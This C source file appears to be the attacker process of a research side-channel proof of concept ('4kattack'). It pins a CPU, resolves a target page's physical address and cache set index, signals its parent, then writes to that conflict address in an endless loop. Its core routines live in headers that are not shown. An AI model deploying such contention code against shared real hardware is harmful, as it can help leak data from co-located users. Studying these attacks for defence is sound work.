#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

#include "attack.h"
#include "setup.h"
#include "utils.h"

#define ATTACKER_CPU 5
#define PSTATE_PCT 100

int main(int argc, char **argv) {

    ASSERT(!claim_cpu(ATTACKER_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));

    uint64_t target_page_offset = 0;
    if (argc == 2) {
        char *offset = argv[1];

        target_page_offset = (uint64_t) strtoul(offset, NULL, 16);
    }

    fprintf(stdout, "\n[4kattack] Targeting page offset 0x%lx\n",
            target_page_offset);


    // Allocate three memory pages for creating address conflicts
    size_t memory_page_size = 4096;

    void *mem = malloc (3 * memory_page_size * sizeof(uint8_t));
    uint8_t *cur = (uint8_t*) mem;
    for (size_t i = 0; i < 3 * memory_page_size; i++) {
        *(cur + i) = 1;
    }

    uintptr_t target = ((((uintptr_t)(cur + memory_page_size))
            & ~((uintptr_t) (memory_page_size - 1))) + target_page_offset);

    uintptr_t target_phy = getPhysAddr((void*) target);
    uint64_t target_phy_set_index = (uint64_t) getSetIndexBits(target_phy, 10, 6);

    fprintf(stdout, "[4kattack] Target address:  "
            "0x%lx (virt), 0x%lx (phy), 0x%lx (set index)\n",
            target, target_phy, target_phy_set_index);

    // Sending alarm signal to parent
    kill(getppid(), SIGALRM);

    // Start writing to desired conflict address
    // pause();
    uint64_t i = 1;
    while (1) {
        i++;
        write_conflict(target);
    }

    free(mem);
}
